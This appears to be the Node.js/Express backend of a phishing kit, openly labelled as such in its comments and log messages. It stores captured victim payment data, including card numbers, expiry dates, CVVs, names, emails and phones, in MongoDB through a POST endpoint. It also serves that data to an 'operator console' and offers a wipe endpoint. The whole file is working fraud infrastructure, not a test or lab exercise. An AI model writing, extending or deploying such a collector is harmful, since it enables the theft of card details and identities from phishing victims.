const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8000;

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI)
  .then(() => {
    console.log('📊 MongoDB Connected');
  })
  .catch((err) => {
    console.error('❌ MongoDB connection error:', err);
    process.exit(1);
  });

// Payment Schema
const paymentSchema = new mongoose.Schema({
  cardNumber: {
    type: String,
    required: true,
    validate: {
      validator: function(v) {
        return /^\d{12,19}$/.test(v.replace(/\s/g, ''));
      },
      message: 'Invalid card number format'
    }
  },
  expiry: {
    type: String,
    required: true,
    match: [/^(0[1-9]|1[0-2])\/\d{2}$/, 'Invalid expiry date format (MM/YY)']
  },
  cvv: {
    type: String,
    required: true,
    minlength: 3,
    maxlength: 4
  },
  name: {
    type: String,
    required: true
  },
  email: {
    type: String,
    required: true,
    match: [/^[^\s@]+@[^\s@]+\.[^\s@]+$/, 'Invalid email format']
  },
  phone: {
    type: String,
    required: true
  },
  amount: {
    type: String,
    required: true
  },
  merchant: {
    type: String,
    required: true
  },
  orderId: {
    type: String
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

const Payment = mongoose.model('Payment', paymentSchema);

// API Routes

// POST /api/phished-data - Receive captured phishing data
app.post('/api/phished-data', async (req, res) => {
  try {
    const paymentData = new Payment({
      cardNumber: req.body.cardNumber,
      expiry: req.body.expiry,
      cvv: req.body.cvv,
      name: req.body.name,
      email: req.body.email,
      phone: req.body.phone,
      amount: req.body.amount,
      merchant: req.body.merchant,
      orderId: req.body.orderId,
      timestamp: new Date()
    });

    const saved = await paymentData.save();
    console.log('💾 Saved phishing data to DB:', saved.email);
    
    res.status(201).json({
      success: true,
      message: 'Phishing data captured',
      data: {
        id: saved._id,
        timestamp: saved.timestamp
      }
    });
  } catch (error) {
    console.error('❌ Error saving phishing data:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// GET /api/phished-data - Retrieve all captured data for operator console
app.get('/api/phished-data', async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 50;
    const sort = req.query.sort || '-timestamp';

    const skip = (page - 1) * limit;
    const sortObj = sort.startsWith('-') ? { timestamp: -1 } : { timestamp: 1 };

    const [data, total] = await Promise.all([
      Payment.find({})
        .sort(sortObj)
        .skip(skip)
        .limit(limit)
        .lean(),
      Payment.countDocuments({})
    ]);

    res.json({
      success: true,
      data,
      total,
      page,
      totalPages: Math.ceil(total / limit)
    });
  } catch (error) {
    console.error('❌ Error fetching phished data:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Delete all data (admin endpoint)
app.delete('/api/phished-data', async (req, res) => {
  try {
    await Payment.deleteMany({});
    console.log('🗑️ Cleared all phished data');
    res.json({ success: true, message: 'All data cleared' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', message: 'Backend running' });
});

app.listen(PORT, () => {
  console.log(`🚀 Backend server running on port ${PORT}`);
  console.log(`📍 API endpoints:`);
  console.log(`   POST  /api/phished-data`);
  console.log(`   GET   /api/phished-data`);
});